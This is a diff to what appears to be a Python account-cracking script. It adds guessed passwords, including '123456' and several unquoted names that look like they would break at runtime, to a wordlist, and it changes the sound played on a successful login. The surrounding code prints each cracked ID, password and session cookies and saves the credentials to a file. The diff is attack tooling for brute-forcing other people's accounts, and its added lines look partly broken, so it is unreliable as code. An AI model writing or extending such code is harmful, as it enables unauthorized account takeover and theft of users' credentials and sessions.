@@ -409,6 +409,12 @@ def passwrd():
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
+					pwv.append(bangladesh)
+					pwv.append(shanto)
+					pwv.append('123456')
+					pwv.append('@#@#@#')
+					pwv.append(shanto1122)
+					pwv.append(bahauddin)
 					pwv.append(nmf+'1122')
 					pwv.append(nmf+'@@@')
 					pwv.append(nmf+'@')
@@ -475,7 +481,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				os.system("play-audio y.mp3 ")
+				os.system("play-audio AM.mp3 ")
 				print(f'\r{H}\n TBS-SUCCESSFUL [💚] {idf} | {pw}\n [💉]COOKIES ➢ {kuki}\n [🚀]USER AGENT ➢ {ua}{N}')
 				cek_apk(session,coki)
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
